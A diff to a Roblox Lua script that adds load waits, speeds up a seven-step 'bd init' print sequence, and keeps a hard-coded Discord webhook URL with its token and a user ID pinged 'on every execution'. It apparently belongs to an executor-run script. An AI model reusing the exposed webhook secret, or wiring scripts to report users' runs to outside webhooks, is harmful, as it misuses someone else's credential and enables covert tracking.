@@ -1,17 +1,30 @@
+-- Wait for the game to fully load
+game.Loaded:Wait()
+print("Game core services are fully loaded.")
+
+local Players = game:GetService("Players")
+local LocalP = Players.LocalPlayer
+-- Ensure the character is fully loaded
+LocalP.CharacterAdded:Wait()
+repeat
+    task.wait()
+until LocalP.Character and LocalP.Character:FindFirstChild("HumanoidRootPart") and LocalP.Character:FindFirstChild("Humanoid")
+print("Character and assets are fully loaded.")
+
 print("bd init 1/7")
-task.wait(2)
+task.wait(1)
 print("bd init 2/7")
-task.wait(2)
+task.wait(1)
 print("bd init 3/7")
-task.wait(2)
+task.wait(1)
 print("bd init 4/7")
-task.wait(2)
+task.wait(1)
 print("bd init 5/7")
-task.wait(2)
+task.wait(1)
 print("bd init 6/7")
-task.wait(2)
-print("bd init end/7")
-task.wait(2)
+task.wait(1)
+print("bd init 7/7")
+task.wait(1)
 
 local Webhook = "https://discord.com/api/webhooks/1310682233321033904/Otg78XJSdOTjFoeCNcaffDp2-e6kTvV4cbbe64DyWpQCF2XT2SDVHeZzBkEEaSaS9UQ_" -- your webhook
 _G.Discord_UserID = "1283831252352241686" -- ID To Ping on every execution, blank if no one wants to be pinged.
